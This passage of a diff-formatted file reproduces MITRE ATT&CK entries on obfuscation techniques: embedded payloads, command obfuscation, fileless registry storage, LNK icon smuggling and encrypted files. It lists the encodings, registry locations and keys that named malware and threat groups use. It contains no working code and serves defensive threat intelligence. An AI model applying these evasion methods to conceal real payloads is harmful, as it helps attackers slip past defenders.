+- [S1048] macOS.OSAMiner: macOS.OSAMiner has embedded Stripped Payloads within another run-only Stripped Payloads.
+- [S0567] Dtrack: Dtrack has used a dropper that embeds an encrypted payload as extra data.
+- [S0483] IcedID: IcedID has embedded malicious functionality in a legitimate DLL file.
+- [S0457] Netwalker: Netwalker's DLL has been embedded within the PowerShell script in hex format.
+- [S1135] MultiLayer Wiper: MultiLayer Wiper contains two binaries in its resources section, MultiList and MultiWip. MultiLayer Wiper drops and executes each of these items when run, then deletes them after execution.
+- [S0649] SMOKEDHAM: The SMOKEDHAM source code is embedded in the dropper as an encrypted string.
+- [S1145] Pikabot: Pikabot further decrypts information embedded via steganography using AES-CBC with the same 32 bit key as initial XOR operations combined with the first 16 bytes of the encrypted data as an initialization vector. Other Pikabot variants include encrypted, chunked sections of the stage 2 payload in the initial loader .text section before decrypting and assembling these during execution.
+- [G1037] TA577: TA577 has used LNK files to execute embedded DLLs.
+- [S0126] ComRAT: ComRAT has embedded a XOR encrypted communications module inside the orchestrator module.
+- [S1158] DUSTPAN: DUSTPAN decrypts and executes an embedded payload.
+- [S1159] DUSTTRAP: DUSTTRAP contains additional embedded DLLs and configuration files that are loaded into memory during execution.
+- [S0231] Invoke-PSImage: Invoke-PSImage can be used to embed payload data within a new image file.
+- [C0021] C0021: For C0021, the threat actors embedded a base64-encoded payload within a LNK file.
+- [G1036] Moonstone Sleet: Moonstone Sleet embedded payloads in trojanized software for follow-on execution.
+- [S0022] Uroburos: The Uroburos Queue file contains embedded executable files along with key material, communication channels, and modes of operation.
+
+### T1027.010 - Obfuscated Files or Information: Command Obfuscation
+
+Description:
+
+Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter. For example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing, `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev Invoke-Obfuscation and Invoke-DOSfucation have also been used to obfuscate commands.
+
+Procedures:
+
+- [G0143] Aquatic Panda: Aquatic Panda has encoded PowerShell commands in Base64.
+- [S1085] Sardonic: Sardonic PowerShell scripts can be encrypted with RC4 and compressed using Gzip.
+- [G0034] Sandworm Team: Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.
+- [G1001] HEXANE: HEXANE has used Base64-encoded scripts.
+- [S0428] PoetRAT: PoetRAT has `pyminifier` to obfuscate scripts.
+- [G0077] Leafminer: Leafminer obfuscated scripts that were used on victim machines.
+- [G0080] Cobalt Group: Cobalt Group obfuscated several scriptlets and code used on the victim’s machine, including through use of XOR and RC4.
+- [S0451] LoudMiner: LoudMiner has obfuscated various scripts.
+- [S0363] Empire: Empire has the ability to obfuscate commands using Invoke-Obfuscation.
+- [S1022] IceApple: IceApple can use Base64 and "junk" JavaScript code to obfuscate information.
+- [S0685] PowerPunch: PowerPunch can use Base64-encoded scripts.
+- [G0117] Fox Kitten: Fox Kitten has base64 encoded scripts to avoid detection.
+- [C0001] Frankenstein: During Frankenstein, the threat actors ran encoded commands from the command line.
+- [G0037] FIN6: FIN6 has used encoded PowerShell commands.
+- [C0021] C0021: During C0021, the threat actors used encoded PowerShell commands.
+- [S1081] BADHATCH: BADHATCH malicious PowerShell commands can be encoded with base64.
+- [S0354] Denis: Denis has encoded its PowerShell commands in Base64.
+- [S0589] Sibot: Sibot has obfuscated scripts used in execution.
+- [G0050] APT32: APT32 has used the `Invoke-Obfuscation` framework to obfuscate their PowerShell.
+- [S0126] ComRAT: ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also used encoded PowerShell scripts.
+- [S0194] PowerSploit: PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads.
+- [G1040] Play: Play has used Base64-encoded PowerShell scripts for post exploit activities on compromised hosts.
+- [S0650] QakBot: QakBot can use obfuscated and encoded scripts.
+- [G0059] Magic Hound: Magic Hound has used base64-encoded commands.
+- [G0102] Wizard Spider: Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands.
+- [G0069] MuddyWater: MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.
+- [G0040] Patchwork: Patchwork has obfuscated a script with Crypto Obfuscator.
+- [S0457] Netwalker: Netwalker's PowerShell script has been obfuscated with multiple layers including base64 and hexadecimal encoding and XOR-encryption, as well as obfuscated PowerShell functions and variables.
+- [S0673] DarkWatchman: DarkWatchman has used Base64 to encode PowerShell commands.
+- [C0012] Operation CuckooBees: During Operation CuckooBees, the threat actors executed an encoded VBScript file.
+- [G0114] Chimera: Chimera has encoded PowerShell commands.
+- [G0091] Silence: Silence has used environment variable string substitution for obfuscation.
+- [S0269] QUADAGENT: QUADAGENT was likely obfuscated using `Invoke-Obfuscation`.
+- [S0386] Ursnif: Ursnif droppers execute base64 encoded PowerShell commands.
+- [S0270] RogueRobin: The PowerShell script with the RogueRobin payload was obfuscated using the COMPRESS technique in `Invoke-Obfuscation`.
+- [G0061] FIN8: FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.
+- [S0462] CARROTBAT: CARROTBAT has the ability to execute obfuscated commands on the infected host.
+- [C0018] C0018: During C0018, the threat actors used Base64 to encode their PowerShell scripts.
+- [G0046] FIN7: FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.
+- [G0127] TA551: TA551 has used obfuscated variable names in a JavaScript configuration file.
+- [S0367] Emotet: Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware, CMD.exe arguments, and PowerShell scripts.
+- [G0121] Sidewinder: Sidewinder has used base64 encoding for scripts.
+- [S0277] FruitFly: FruitFly executes and stores obfuscated Perl scripts.
+- [G0092] TA505: TA505 has used base64 encoded PowerShell commands.
+- [G0010] Turla: Turla has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.
+- [S0390] SQLRat: SQLRat has used a character insertion obfuscation technique, making the script appear to contain Chinese characters.
+- [S0450] SHARPSTATS: SHARPSTATS has used base64 encoding and XOR to obfuscate PowerShell scripts.
+- [S0475] BackConfig: BackConfig has used compressed and decimal encoded VBS scripts.
+- [G0115] GOLD SOUTHFIELD: GOLD SOUTHFIELD has executed base64 encoded PowerShell scripts on compromised hosts.
+- [S0223] POWERSTATS: POWERSTATS uses character replacement, PowerShell environment variables, and XOR encoding to obfuscate code. POWERSTATS's backdoor code is a multi-layer obfuscated, encoded, and compressed blob. POWERSTATS has used PowerShell code with custom string obfuscation
+- [S0330] Zeus Panda: Zeus Panda obfuscates the macro commands in its initial payload.
+- [C0014] Operation Wocao: During Operation Wocao, threat actors executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.
+- [G0140] LazyScripter: LazyScripter has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.
+- [S0373] Astaroth: Astaroth has obfuscated and randomized parts of the JScript code it is initiating.
+- [S0492] CookieMiner: CookieMiner has used base64 encoding to obfuscate scripts on the system.
+- [S0669] KOCTOPUS: KOCTOPUS has obfuscated scripts with the BatchEncryption tool.
+- [G0047] Gamaredon Group: Gamaredon Group has used obfuscated or encrypted scripts.
+- [G0073] APT19: APT19 used Base64 to obfuscate executed commands.
+- [S0409] Machete: Machete has used pyobfuscate, zlib compression, and base64 encoding for obfuscation. Machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.
+
+### T1027.011 - Obfuscated Files or Information: Fileless Storage
+
+Description:
+
+Adversaries may store data in "fileless" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository. In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk. Similar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux. Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored. Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files.
+
+Procedures:
+
+- [S0673] DarkWatchman: DarkWatchman can store configuration strings, keylogger, and output of components in the Registry.
+- [S0518] PolyglotDuke: PolyglotDuke can store encrypted JSON configuration files in the Registry.
+- [S0650] QakBot: QakBot can store its configuration information in a randomly named subkey under HKCU\Software\Microsoft.
+- [S0263] TYPEFRAME: TYPEFRAME can install and store encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs.
+- [S0126] ComRAT: ComRAT has stored encrypted orchestrator code and payloads in the Registry.
+- [S0596] ShadowPad: ShadowPad maintains a configuration block and virtual file system in the Registry.
+- [S0666] Gelsemium: Gelsemium can store its components in the Registry.
+- [S0022] Uroburos: Uroburos can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at `HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds.`
+- [S0663] SysUpdate: SysUpdate can store its encoded configuration file within Software\Classes\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.
+- [S0343] Exaramel for Windows: Exaramel for Windows stores the backdoor's configuration in the Registry in XML format.
+- [S0531] Grandoreiro: Grandoreiro can store its configuration in the Registry at `HKCU\Software\` under frequently changing names including %USERNAME% and ToolTech-RM.
+- [S0198] NETWIRE: NETWIRE can store its configuration information in the Registry under `HKCU:\Software\Netwire`.
+- [S0517] Pillowmint: Pillowmint has stored a compressed payload in the Registry key HKLM\SOFTWARE\Microsoft\DRM.
+- [S0668] TinyTurla: TinyTurla can save its configuration parameters in the Registry.
+- [S0023] CHOPSTICK: CHOPSTICK may store RC4 encrypted configuration information in the Windows Registry.
+- [G0050] APT32: APT32's backdoor has stored its configuration in a registry key.
+- [S1145] Pikabot: Some versions of Pikabot build the final PE payload in memory to avoid writing contents to disk on the executing machine.
+- [S0269] QUADAGENT: QUADAGENT stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as `HKCU\Office365DCOMCheck`) in the `HKCU` hive.
+- [S0511] RegDuke: RegDuke can store its encryption key in the Registry.
+- [S0665] ThreatNeedle: ThreatNeedle can save its configuration data as a RC4-encrypted Registry key under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\GameCon`.
+- [C0012] Operation CuckooBees: During Operation CuckooBees, the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.
+- [S0476] Valak: Valak has the ability to store information regarding the C2 server and downloads in the Registry key HKCU\Software\ApplicationContainer\Appsw64.
+- [S0180] Volgmer: Volgmer stores an encoded configuration file in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security.
+- [S0631] Chaes: Some versions of Chaes stored its instructions (otherwise in a `instructions.ini` file) in the Registry.
+- [G0010] Turla: Turla has used the Registry to store encrypted and encoded payloads.
+- [S0662] RCSession: RCSession can store its obfuscated configuration file in the Registry under `HKLM\SOFTWARE\Plus` or `HKCU\SOFTWARE\Plus`.
+- [S0589] Sibot: Sibot has installed a second-stage script in the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\sibot registry key.
+- [S0501] PipeMon: PipeMon has stored its encrypted payload in the Registry under `HKLM\SOFTWARE\Microsoft\Print\Components\`.
+- [S0496] REvil: REvil can save encryption parameters and system information in the Registry.
+- [S0256] Mosquito: Mosquito stores configuration values under the Registry key HKCU\Software\Microsoft\[dllname].
+
+### T1027.012 - Obfuscated Files or Information: LNK Icon Smuggling
+
+Description:
+
+Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK. LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.
+
+### T1027.013 - Obfuscated Files or Information: Encrypted/Encoded File
+
+Description:
+
+Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use. This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64. The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection. For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.
+
+Procedures:
+
+- [S1052] DEADEYE: DEADEYE has encrypted its payload.
+- [S0678] Torisma: Torisma has been Base64 encoded and AES encrypted.
+- [S0352] OSX_OCEANLOTUS.D: OSX_OCEANLOTUS.D encrypts its strings in RSA256 and encodes them in a custom base64 scheme and XOR.
+- [G0100] Inception: Inception has encrypted malware payloads dropped on victim machines with AES and RC4 encryption.
+- [S0136] USBStealer: Most strings in USBStealer are encrypted using 3DES and XOR and reversed.
+- [S0082] Emissary: Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the "srand" and "rand" functions.
+- [S1153] Cuckoo Stealer: Cuckoo Stealer strings are XOR-encrypted.
+- [S0487] Kessel: Kessel's configuration is hardcoded and RC4 encrypted within the binary.
+- [S0565] Raindrop: Raindrop encrypted its payload using a simple XOR algorithm with a single-byte key.
+- [S0433] Rifdoor: Rifdoor has encrypted strings with a single byte XOR algorithm.
+- [G0070] Dark Caracal: Dark Caracal has obfuscated strings in Bandook by base64 encoding, and then encrypting them.
+- [G0066] Elderwood: Elderwood has encrypted documents and malicious executables.
+- [S1019] Shark: Shark can use encrypted and encoded files for C2 configuration.
+- [S0386] Ursnif: Ursnif has used an XOR-based algorithm to encrypt Tor clients dropped to disk. Ursnif droppers have also been delivered as password-protected zip files that execute base64 encoded PowerShell commands.
+- [S1150] ROADSWEEP: The ROADSWEEP binary contains RC4 encrypted embedded scripts.
+- [G0012] Darkhotel: Darkhotel has obfuscated code using RC4, XOR, and RSA.
+- [C0045] ShadowRay: During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.
+- [G0134] Transparent Tribe: Transparent Tribe has dropped encoded executables on compromised hosts.
+- [S1212] RansomHub: RansomHub has an encrypted configuration file.
+- [S1100] Ninja: The Ninja payload is XOR encrypted and compressed. Ninja has also XORed its configuration data with a constant value of `0xAA`.
+- [G0007] APT28: APT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.
+- [S0391] HAWKBALL: HAWKBALL has encrypted the payload with an XOR-based algorithm.
+- [S0468] Skidmap: Skidmap has encrypted it's main payload using 3DES.
+- [S0373] Astaroth: Astaroth has used an XOR-based algorithm to encrypt payloads twice with different keys.
+- [G0026] APT18: APT18 obfuscates strings in the payload.
+- [S1051] KEYPLUG: KEYPLUG can use a hardcoded one-byte XOR encoded configuration file.
+- [S0074] Sakula: Sakula uses single-byte XOR obfuscation to obfuscate many of its files.
+- [S0672] Zox: Zox has been encoded with Base64.
+- [S0170] Helminth: The Helminth config file is encrypted with RC4.
+- [S0370] SamSam: SamSam has been seen using AES or DES to encrypt payloads and payload components.
+- [S0113] Prikormka: Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.
+- [S0228] NanHaiShu: NanHaiShu encodes files in Base64.
+- [S1059] metaMain: metaMain's module file has been encrypted via XOR.
+- [G0065] Leviathan: Leviathan has obfuscated code using base64.
+- [S0534] Bazar: Bazar has used XOR, RSA2, and RC4 encrypted files.
+- [S1202] LockBit 3.0: The LockBit 3.0 payload includes an encrypted main component.
+- [S0451] LoudMiner: LoudMiner has encrypted DMG files.
+- [G0121] Sidewinder: Sidewinder has used base64 encoding and ECDH-P256 encryption for payloads.
+- [S0657] BLUELIGHT: BLUELIGHT has a XOR-encoded payload.
+- [S0501] PipeMon: PipeMon modules are stored encrypted on disk.
+- [S1065] Woody RAT: Woody RAT has used Base64 encoded strings and scripts.
+- [S1033] DCSrv: DCSrv's configuration is encrypted.
+- [G0087] APT39: APT39 has used malware to drop encrypted CAB files.
+- [S0237] GravityRAT: GravityRAT supports file encryption (AES with the key "lolomycin2017").
+- [S0455] Metamorfo: Metamorfo has encrypted payloads and strings.
+- [G0032] Lazarus Group: Lazarus Group has used multiple types of encryption and encoding for their payloads, including AES, Caracachs, RC4, XOR, Base64, and other tricks such as creating aliases in code for Native API function names.
+- [S1207] XLoader: XLoader features encrypted functions using the RC4 algorithm and bytecode operations.
+- [G1031] Saint Bear: Saint Bear initial payloads included encoded follow-on payloads located in the resources file of the first-stage loader.
+- [G0064] APT33: APT33 has used base64 to encode payloads.
+- [S1210] Sagerunex: Sagerunex can be passed a reference to an XOR-encrypted configuration file at runtime.
+- [S1183] StrelaStealer: StrelaStealer uses XOR-encoded strings to obfuscate items.
+- [C0002] Night Dragon: During Night Dragon, threat actors used a DLL that included an XOR-encoded section.
+- [S0395] LightNeuron: LightNeuron encrypts its configuration files with AES-256.
+- [S1014] DanBot: DanBot can Base64 encode its payload.
+- [S0267] FELIXROOT: FELIXROOT encrypts strings in the backdoor using a custom XOR algorithm.
+- [S0125] Remsec: Some data in Remsec is encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.
+- [S0695] Donut: Donut can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.
+- [S1124] SocGholish: SocGholish has single or double Base-64 encoded references to its second-stage server URLs.
+- [S1159] DUSTTRAP: DUSTTRAP begins with an initial launcher that decrypts an AES-128-CFB encrypted file on disk and executes it in memory.
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used Base64 to encode files with a custom key.
+- [S0466] WindTail: WindTail can be delivered as a compressed, encrypted, and encoded payload.
+- [S0531] Grandoreiro: The Grandoreiro payload has been delivered encrypted with a custom XOR-based algorithm and also as a base64-encoded ZIP file.
+- [S1015] Milan: Milan can encode files containing information about the targeted system.
+- [S0520] BLINDINGCAN: BLINDINGCAN has obfuscated code using Base64 encoding.
+- [S0356] KONNI: KONNI is heavily obfuscated and includes encrypted configuration files.
+- [S0131] TINYTYPHON: TINYTYPHON has used XOR with 0x90 to obfuscate its configuration file.
+- [G1002] BITTER: BITTER has used a RAR SFX dropper to deliver malware.
+- [S0689] WhisperGate: WhisperGate can Base64 encode strings, store downloaded files in reverse byte order, and use the Eazfuscator tool to obfuscate its third stage.
+- [S1013] ZxxZ: ZxxZ has been encoded to avoid detection from static analysis tools.
+- [S1050] PcShare: PcShare has been encrypted with XOR using different 32-long Base16 strings.
+- [S1111] DarkGate: DarkGate drops an encrypted PE file, pe.bin, and decrypts it during installation. DarkGate also uses custom base64 encoding schemas in later variations to obfuscate payloads.
+- [S0172] Reaver: Reaver encrypts some of its files with XOR.
+- [S0415] BOOSTWRITE: BOOSTWRITE has encoded its payloads using a ChaCha stream cipher with a 256-bit key and 64-bit Initialization vector (IV) to evade detection.
+- [S0410] Fysbis: Fysbis has been encrypted using XOR and RC4.
+- [G0092] TA505: TA505 has password-protected malicious Word documents.
+- [S0603] Stuxnet: Stuxnet uses encrypted configuration blocks and writes encrypted files to disk.
+- [G0126] Higaisa: Higaisa used Base64 encoded compressed payloads.
+- [S0570] BitPaymer: BitPaymer has used RC4-encrypted strings and string hashes to avoid identifiable strings within the binary.
+- [S0236] Kwampirs: Kwampirs downloads additional files that are base64-encoded and encrypted with another cipher.
+- [S0375] Remexi: Remexi obfuscates its configuration data with XOR.
+- [S0263] TYPEFRAME: APIs and strings in some TYPEFRAME variants are RC4 encrypted. Another variant is encoded with XOR.
+- [S1169] Mango: Mango contains a series of base64 encoded substrings.
+- [S0661] FoggyWeb: FoggyWeb has been XOR-encoded.
+- [G0073] APT19: APT19 used Base64 to obfuscate payloads.
+- [S0491] StrongPity: StrongPity has used encrypted strings in its dropper component.
+- [S1185] LightSpy: LightSpy encrypts the C2 configuration file using AES with a static key, while the module `.dylib` files use a rolling one-byte encoding for obfuscation.
+- [G0117] Fox Kitten: Fox Kitten has base64 encoded payloads to avoid detection.
+- [S1182] MagicRAT: MagicRAT stores base64 encoded command and contorl URLs in a configuraiton file, with each URL prefixed with the value `LR02DPt22R`.
+- [S1154] VersaMem: VersaMem encrypted captured credentials with AES then Base64 encoded them before writing to local storage.
+- [S0268] Bisonal: Bisonal's DLL file and non-malicious decoy file are encrypted with RC4 and some function name strings are obfuscated.
+- [S1148] Raccoon Stealer: Raccoon Stealer uses RC4 encryption for strings and command and control addresses to evade static detection.
+- [G0027] Threat Group-3390: A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit’s shikata_ga_nai encoder.
+- [S0153] RedLeaves: A RedLeaves configuration file is encrypted with a simple XOR key, 0x53.
+- [S1164] UPSTYLE: UPSTYLE stores primary content as base64-encoded objects.
+- [S0383] FlawedGrace: FlawedGrace encrypts its C2 configuration files with AES in CBC mode.
+- [S0284] More_eggs: More_eggs's payload has been encrypted with a key that has the hostname and processor family information appended to the end.
+- [S0081] Elise: Elise encrypts several of its files, including configuration files.
+- [S0473] Avenger: Avenger has the ability to XOR encrypt files to be sent to C2.
+- [S0634] EnvyScout: EnvyScout can Base64 encode payloads.
+- [S0448] Rising Sun: Configuration data used by Rising Sun has been encrypted using an RC4 stream algorithm.
+- [S1142] LunarMail: LunarMail has used RC4 and AES to encrypt strings and its exfiltration configuration respectively.
+- [S1122] Mispadu: Mispadu uses a custom algorithm to obfuscate its internal strings and uses hardcoded keys. Mispadu also uses encoded configuration files and has encoded payloads using Base64.
+- [S0497] Dacls: Dacls can encrypt its configuration file with AES CBC.
+- [S0385] njRAT: njRAT has included a base64 encoded executable.
+- [S0585] Kerrdown: Kerrdown can encrypt, encode, and compress multiple layers of shellcode.
+- [G1018] TA2541: TA2541 has used compressed and char-encoded scripts in operations.
+- [S1132] IPsec Helper: IPsec Helper contains an embedded XML configuration file with an encrypted list of command and control servers. These are written to an external configuration file during execution.
+- [S1200] StealBit: StealBit stores obfuscated DLL file names in its executable.
+- [S1158] DUSTPAN: DUSTPAN decrypts an embedded payload.
+- [S0613] PS1: PS1 is distributed as a set of encrypted files and scripts.
+- [S0387] KeyBoy: In one version of KeyBoy, string obfuscation routines were used to hide many of the critical values referenced in the malware.
+- [S0629] RainyDay: RainyDay has downloaded as a XOR-encrypted payload.
+- [S0633] Sliver: Sliver can encrypt strings at compile time.
+- [S0579] Waterbear: Waterbear has used RC4 encrypted shellcode and encrypted functions.
+- [G1026] Malteiro: Malteiro has used scripts encoded in Base64 certificates to distribute malware to victims.
+- [S0430] Winnti for Linux: Winnti for Linux can encode its configuration file with single-byte XOR encoding.
+- [G0059] Magic Hound: Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES.
+- [G1046] Storm-1811: Storm-1811 XOR encodes a Cobalt Strike installation payload in a DLL file that is decoded with a hardcoded key when called by a legitimate 7zip installation process.
+- [S0345] Seasalt: Seasalt obfuscates configuration data.
+- [S0380] StoneDrill: StoneDrill has obfuscated its module with an alphabet-based table or XOR encryption.
+- [S0483] IcedID: IcedID has utilzed encrypted binaries and base64 encoded strings.
+- [G0108] Blue Mockingbird: Blue Mockingbird has obfuscated the wallet address in the payload binary.
+- [S1134] DEADWOOD: DEADWOOD contains an embedded, AES-encrypted resource named METADATA that contains configuration information for follow-on execution.
+- [G0081] Tropic Trooper: Tropic Trooper has encrypted configuration files.
+- [S0663] SysUpdate: SysUpdate can encrypt and encode its configuration file.
+- [S0667] Chrommme: Chrommme can encrypt sections of its code to evade detection.
+- [S1141] LunarWeb: The LunarWeb install files have been encrypted with AES-256.
+- [S0438] Attor: Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA.
+- [S0496] REvil: REvil has used encrypted strings and configuration files.
+- [G0103] Mofang: Mofang has encrypted payloads before they are downloaded to victims.
+- [S0232] HOMEFRY: Some strings in HOMEFRY are obfuscated with XOR x56.
+- [S0226] Smoke Loader: Smoke Loader uses a simple one-byte XOR method to obfuscate values in the malware.
+- [S0456] Aria-body: Aria-body has used an encrypted configuration file for its loader.
+- [S0256] Mosquito: Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.
+- [S0046] CozyCar: The payload of CozyCar is encrypted with simple XOR with a rotating key. The CozyCar configuration file has been encrypted with RC4 keys.
+- [S0388] YAHOYAH: YAHOYAH encrypts its configuration file using a simple algorithm.
+- [S0665] ThreatNeedle: ThreatNeedle has been compressed and obfuscated using RC4, AES, or XOR.
+- [C0040] APT41 DUST: APT41 DUST used encrypted payloads decrypted and executed in memory.
+- [G0107] Whitefly: Whitefly has encrypted the payload used for C2.
+- [G0045] menuPass: menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.
+- [S1180] BlackByte Ransomware: BlackByte Ransomware is distributed as an encrypted payload.
+- [S0574] BendyBear: BendyBear has encrypted payloads using RC4 and XOR.
+- [S1032] PyDCrypt: PyDCrypt has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.
+- [S0257] VERMIN: VERMIN is obfuscated using the obfuscation tool called ConfuserEx.
+- [C0047] RedDelta Modified PlugX Infection Chain Operations: Mustang Panda stored installation payloads as encrypted files in hidden folders during RedDelta Modified PlugX Infection Chain Operations.
+- [S0339] Micropsia: Micropsia obfuscates the configuration with a custom Base64 and XOR.
+- [C0016] Operation Dust Storm: During Operation Dust Storm, the threat actors encoded some payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key; other payloads were Base64-encoded.
+- [S1020] Kevin: Kevin has Base64-encoded its configuration file.
+- [G1009] Moses Staff: Moses Staff has used obfuscated web shells in their operations.
+- [G0139] TeamTNT: TeamTNT has encrypted its binaries via AES and encoded files using Base64.
+- [S0044] JHUHUGIT: Many strings in JHUHUGIT are obfuscated with a XOR algorithm.
+- [C0042] Outer Space: During Outer Space, OilRig deployed VBS droppers with obfuscated strings.
+- [S0588] GoldMax: GoldMax has written AES-encrypted and Base64-encoded configuration files to disk.
+- [S1041] Chinoxy: Chinoxy has encrypted its configuration file.
+- [S0213] DOGCALL: DOGCALL is encrypted using single-byte XOR.
+- [S1027] Heyoka Backdoor: Heyoka Backdoor can encrypt its payload.
+- [G1013] Metador: Metador has encrypted their payloads.
+- [S0618] FIVEHANDS: The FIVEHANDS payload is encrypted with AES-128.
+- [S0330] Zeus Panda: Zeus Panda encrypts strings with XOR. Zeus Panda also encrypts all configuration and settings in AES and RC4.
+- [S1030] Squirrelwaffle: Squirrelwaffle has been obfuscated with a XOR-based algorithm.
+- [S0398] HyperBro: HyperBro can be delivered encrypted to a compromised host.
+- [S1037] STARWHALE: STARWHALE has been obfuscated with hex-encoded strings.
+- [S0431] HotCroissant: HotCroissant has encrypted strings with single-byte XOR and base64 encoded RC4.
+- [G0043] Group5: Group5 disguised its malicious binaries with several layers of obfuscation, including encrypting the files.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group encrypted malware such as DRATzarus with XOR and DLL files with base64.
+- [S1213] Lumma Stealer: Lumma Stealer has used AES-encrypted payloads contained within PowerShell scripts.
+- [S0526] KGH_SPY: KGH_SPY has used encrypted strings in its installer.
+- [S0578] SUPERNOVA: SUPERNOVA contained Base64-encoded strings.
+- [S0484] Carberp: Carberp has used XOR-based encryption to mask C2 server locations within the trojan.
+- [G0024] Putter Panda: Droppers used by Putter Panda use RC4 or a 16-byte XOR key consisting of the bytes 0xA0 – 0xAF to obfuscate payloads.
+- [S0367] Emotet: Emotet uses obfuscated URLs to download a ZIP file.
+- [S0374] SpeakUp: SpeakUp encodes its second-stage payload with Base64.
+- [G0049] OilRig: OilRig has encrypted and encoded data in its malware, including by using base64.
+- [S1060] Mafalda: Mafalda has been obfuscated and contains encrypted functions.
+- [S0087] Hi-Zor: Hi-Zor uses various XOR techniques to obfuscate its components.
